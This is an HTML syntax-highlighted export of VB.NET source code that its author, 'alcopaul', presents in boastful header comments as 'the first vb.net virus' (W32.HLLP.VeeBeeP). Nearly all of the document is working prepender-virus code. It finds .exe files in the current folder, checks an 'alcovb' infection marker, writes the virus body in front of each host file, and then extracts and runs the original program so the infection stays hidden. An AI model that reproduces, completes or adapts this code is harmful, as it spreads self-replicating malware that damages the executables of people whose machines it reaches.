<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
.sc11 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">' ===================
' vb.net.veebeep
' ===================
' 
' welcome to my first vb.net virus.. and the first vb.net virus i think reported in the avs.. writing this one is more
' difficult than writing w32.syra aka w32.hllp.flatei, a true msil prepender...
' 
' a boring day, i planned to write a virus in vb.net... i studied the documentation of beta 2 framework sdk, built a pure
' visual basic.net virus and after finishing it, the compiled virus wont work as i wish...
' 
' fileget routine only allocates only more or less 23k bytes in dotnet beta 2 framework (i don't know
' if future releases don't have this stupid bug)... fuck.. what if the host is more than 23k bytes?... so i relied on
' some classes....
' 
' and it werked...
' 
' the virus works in my winme with framework beta 2 installed... computer associates told me that it doesn't work
' in framework version greater than beta two.. but look at this..
' 
' http://securityresponse.symantec.com/avcenter/venc/data/w32.hllp.alpoor.html
' 
' docued to work man.. but contains some misinformation
' 
' [snip]
' 
' NOTE: The virus does not infect normal DOS (MZ) or Windows (PE) executable files. It determines whether the file it is 
' about to infect is a .NET file. If not, the file will not be infected.
' 
' [snip]
' 
' my w32.syra.b does that one, which was submitted to 29a7 (hope they'll publish it)
' 
' presenting my sloppy code...
' 
' heheehehe
' 
' alcopaul
' 
' ======================================================================================================================
</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">Microsoft.VisualBasic</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">System.Reflection</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">System.IO</span><span class="sc0">

</span><span class="sc3">Module</span><span class="sc0"> </span><span class="sc7">Virus</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Main</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">myMod</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">System.Reflection.Module</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">[Assembly]</span><span class="sc6">.</span><span class="sc7">GetExecutingAssembly</span><span class="sc6">().</span><span class="sc7">GetModules</span><span class="sc6">()(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">sfile</span><span class="sc0"> </span><span class="sc3">as</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc0"> </span><span class="sc3">as</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">arr1</span><span class="sc0"> </span><span class="sc3">as</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0"> </span><span class="sc3">as</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">hostlen1</span><span class="sc0"> </span><span class="sc3">as</span><span class="sc0"> </span><span class="sc3">integer</span><span class="sc0">
</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">mmm</span><span class="sc0"> </span><span class="sc3">as</span><span class="sc0"> </span><span class="sc3">string</span><span class="sc0">
</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">ddd</span><span class="sc0"> </span><span class="sc3">as</span><span class="sc0"> </span><span class="sc3">string</span><span class="sc0">
</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">hostlen</span><span class="sc0"> </span><span class="sc3">as</span><span class="sc0"> </span><span class="sc3">integer</span><span class="sc0">
</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">sign</span><span class="sc0"> </span><span class="sc3">as</span><span class="sc0"> </span><span class="sc3">string</span><span class="sc0">
</span><span class="sc7">sfile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">CurDir</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\*.exe"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">sfile</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc11">a</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">sfile</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"/"</span><span class="sc0">
</span><span class="sc7">sfile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0">
</span><span class="sc7">arr1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Split</span><span class="sc6">(</span><span class="sc11">a</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"/"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">arr1</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">host</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">MyMod.Name</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">Goto</span><span class="sc0"> </span><span class="sc7">g</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">MsgBox</span><span class="sc6">(</span><span class="sc4">"the first VB.NET virus"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbOKonly</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"W32.HLLP.VeeBeeP by alcopaul"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">hhh</span><span class="sc6">:</span><span class="sc0">
</span><span class="sc7">Beep</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">exit</span><span class="sc0"> </span><span class="sc3">for</span><span class="sc0">
</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">fs1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">FileStream</span><span class="sc6">(</span><span class="sc7">host</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileMode.Open</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileAccess.Read</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">r1</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">BinaryReader</span><span class="sc6">(</span><span class="sc7">fs1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">hostlen1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">84</span><span class="sc0">
</span><span class="sc7">r1.BaseStream.Seek</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SeekOrigin.Begin</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">bytes1</span><span class="sc6">(</span><span class="sc2">84</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">numBytesToRead1</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">CInt</span><span class="sc6">(</span><span class="sc2">84</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">numBytesRead1</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">numBytesToRead1</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">n1</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">r1.Read</span><span class="sc6">(</span><span class="sc7">bytes1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">numBytesRead1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">numBytesToRead1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">n1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc1">' We're at EOF
</span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">numBytesRead1</span><span class="sc0"> </span><span class="sc6">+=</span><span class="sc0"> </span><span class="sc7">n1</span><span class="sc0">
</span><span class="sc7">numBytesToRead1</span><span class="sc0"> </span><span class="sc6">-=</span><span class="sc0"> </span><span class="sc7">n1</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0">
</span><span class="sc7">r1.Close</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">FileOpen</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"sig.txt"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">OpenMode.Binary</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">FilePut</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bytes1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">FileClose</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">FileOpen</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"sig.txt"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">OpenMode.Input</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">ddd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LineInput</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">FileClose</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">kill</span><span class="sc6">(</span><span class="sc4">"sig.txt"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">mmm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">ddd</span><span class="sc6">,</span><span class="sc2">7</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">ddd</span><span class="sc6">,</span><span class="sc2">7</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">lcase</span><span class="sc6">(</span><span class="sc7">mmm</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"alcovb"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
</span><span class="sc3">goto</span><span class="sc0"> </span><span class="sc7">noinfection</span><span class="sc0">
</span><span class="sc3">else</span><span class="sc0">
</span><span class="sc3">goto</span><span class="sc0"> </span><span class="sc7">g</span><span class="sc0">
</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc7">noinfection</span><span class="sc6">:</span><span class="sc0">
</span><span class="sc3">try</span><span class="sc0">
</span><span class="sc7">infect</span><span class="sc6">(</span><span class="sc7">host</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">exit</span><span class="sc0"> </span><span class="sc3">for</span><span class="sc0">
</span><span class="sc3">catch</span><span class="sc0">
</span><span class="sc3">goto</span><span class="sc0"> </span><span class="sc7">g</span><span class="sc0">
</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">try</span><span class="sc0">
</span><span class="sc7">g</span><span class="sc6">:</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0">
</span><span class="sc1">'extract host
</span><span class="sc3">try</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">fs</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">FileStream</span><span class="sc6">(</span><span class="sc7">MyMod.FullyQualifiedName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileMode.Open</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileAccess.Read</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">r</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">BinaryReader</span><span class="sc6">(</span><span class="sc7">fs</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">hostlen</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fs.Length</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">6145</span><span class="sc0">
</span><span class="sc7">r.BaseStream.Seek</span><span class="sc6">(</span><span class="sc2">6145</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SeekOrigin.Begin</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">bytes</span><span class="sc6">(</span><span class="sc7">hostlen</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">numBytesToRead</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">CInt</span><span class="sc6">(</span><span class="sc7">hostlen</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">numBytesRead</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">numBytesToRead</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">r.Read</span><span class="sc6">(</span><span class="sc7">bytes</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">numBytesRead</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">numBytesToRead</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc1">' We're at EOF
</span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">numBytesRead</span><span class="sc0"> </span><span class="sc6">+=</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0">
</span><span class="sc7">numBytesToRead</span><span class="sc0"> </span><span class="sc6">-=</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0">
</span><span class="sc7">r.Close</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">FileOpen</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vbnet.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">OpenMode.Binary</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">FilePut</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bytes</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">FileClose</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Shell</span><span class="sc6">(</span><span class="sc4">"vbnet.exe "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Command</span><span class="sc6">(),</span><span class="sc0"> </span><span class="sc7">AppWinStyle.NormalFocus</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">catch</span><span class="sc0">
</span><span class="sc7">msgbox</span><span class="sc6">(</span><span class="sc4">"first generation"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">try</span><span class="sc0">
</span><span class="sc7">wet</span><span class="sc6">:</span><span class="sc0">
</span><span class="sc3">try</span><span class="sc0">
</span><span class="sc7">File.Delete</span><span class="sc6">(</span><span class="sc4">"vbnet.exe"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">catch</span><span class="sc0">
</span><span class="sc3">goto</span><span class="sc0"> </span><span class="sc7">wet</span><span class="sc0">
</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">try</span><span class="sc0">
</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">File.Exists</span><span class="sc6">(</span><span class="sc4">"vbnet.exe"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">goto</span><span class="sc0"> </span><span class="sc7">wet</span><span class="sc0">
</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">infect</span><span class="sc6">(</span><span class="sc7">fff</span><span class="sc0"> </span><span class="sc3">as</span><span class="sc0"> </span><span class="sc3">string</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">hostlen1</span><span class="sc0"> </span><span class="sc3">as</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">hostlen</span><span class="sc0"> </span><span class="sc3">as</span><span class="sc0"> </span><span class="sc3">long</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">myMod</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">System.Reflection.Module</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">[Assembly]</span><span class="sc6">.</span><span class="sc7">GetExecutingAssembly</span><span class="sc6">().</span><span class="sc7">GetModules</span><span class="sc6">()(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">fs</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">FileStream</span><span class="sc6">(</span><span class="sc7">MyMod.FullyQualifiedName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileMode.Open</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileAccess.Read</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">r</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">BinaryReader</span><span class="sc6">(</span><span class="sc7">fs</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">hostlen</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">6144</span><span class="sc0">
</span><span class="sc7">r.BaseStream.Seek</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SeekOrigin.Begin</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">bytes</span><span class="sc6">(</span><span class="sc2">6144</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">numBytesToRead</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">CInt</span><span class="sc6">(</span><span class="sc2">6144</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">numBytesRead</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">numBytesToRead</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">r.Read</span><span class="sc6">(</span><span class="sc7">bytes</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">numBytesRead</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">numBytesToRead</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc1">' We're at EOF
</span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">numBytesRead</span><span class="sc0"> </span><span class="sc6">+=</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0">
</span><span class="sc7">numBytesToRead</span><span class="sc0"> </span><span class="sc6">-=</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0">
</span><span class="sc7">r.Close</span><span class="sc6">()</span><span class="sc0">

</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">fs1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">FileStream</span><span class="sc6">(</span><span class="sc7">fff</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileMode.Open</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileAccess.Read</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">r1</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">BinaryReader</span><span class="sc6">(</span><span class="sc7">fs1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">hostlen1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fs1.Length</span><span class="sc0">
</span><span class="sc7">r1.BaseStream.Seek</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SeekOrigin.Begin</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">bytes1</span><span class="sc6">(</span><span class="sc7">hostlen1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">numBytesToRead1</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">CInt</span><span class="sc6">(</span><span class="sc7">fs1.Length</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">numBytesRead1</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">numBytesToRead1</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">n1</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">r1.Read</span><span class="sc6">(</span><span class="sc7">bytes1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">numBytesRead1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">numBytesToRead1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">n1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc1">' We're at EOF
</span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">numBytesRead1</span><span class="sc0"> </span><span class="sc6">+=</span><span class="sc0"> </span><span class="sc7">n1</span><span class="sc0">
</span><span class="sc7">numBytesToRead1</span><span class="sc0"> </span><span class="sc6">-=</span><span class="sc0"> </span><span class="sc7">n1</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0">
</span><span class="sc7">r1.Close</span><span class="sc6">()</span><span class="sc0">

</span><span class="sc7">FileOpen</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">fff</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">OpenMode.Binary</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">FilePut</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bytes</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">FilePut</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bytes1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">FilePut</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"alcovb"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">FileClose</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

